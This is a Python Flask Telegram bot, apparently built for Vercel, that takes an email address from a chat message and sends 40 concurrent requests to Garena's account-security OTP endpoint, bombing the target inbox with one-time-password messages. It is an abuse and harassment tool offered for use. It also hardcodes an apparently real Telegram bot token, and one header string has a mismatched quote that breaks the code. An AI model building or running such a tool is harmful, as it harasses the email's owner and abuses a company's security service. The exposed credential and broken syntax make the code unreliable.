import requests
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

BOT_TOKEN = "8658580899:AAGklJayHDFNGVlSRmRr6oC8J6i_YwLRcKA"
GARENA_URL = "https://100067.connect.garena.com/game/account_security/swap:send_otp"

headers = {
    'User-Agent': "GarenaMSDK/4.0.41(SM-A065F ;Android 15;ar;MA;app 1.123.1 2019120270;)',
    'Connection': "Keep-Alive",
    'Accept': "application/json",
    'Accept-Encoding': "gzip"
}

def send_request(email, req_id):
    try:
        payload = {'app_id': "100067", 'email': email, 'locale': "ar_MA"}
        response = requests.post(GARENA_URL, data=payload, headers=headers, timeout=10)
        return f"[{req_id}] {response.status_code}"
    except Exception as e:
        return f"[{req_id}] خطأ"

def send_telegram(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        for i in range(0, len(text), 4000):
            requests.post(url, json={"chat_id": chat_id, "text": text[i:i+4000]}, timeout=5)
    except:
        pass

@app.route("/", methods=["GET"])
def home():
    return "Bot is running", 200

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update or "message" not in update:
            return jsonify({"status": "ok"}), 200
        
        chat_id = update["message"].get("chat", {}).get("id")
        email = update["message"].get("text", "").strip()
        
        if not chat_id:
            return jsonify({"status": "ok"}), 200
        
        if "@" in email and "." in email:
            send_telegram(chat_id, f"جاري ارسال 40 طلب الى {email}...")
            
            results = []
            with ThreadPoolExecutor(max_workers=40) as executor:
                futures = [executor.submit(send_request, email, i) for i in range(1, 41)]
                results = [f.result() for f in futures]
            
            result_text = "\n".join(results)
            send_telegram(chat_id, f"النتائج:\n\n{result_text}")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "ok"}), 200

# Vercel handler
handler = app

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
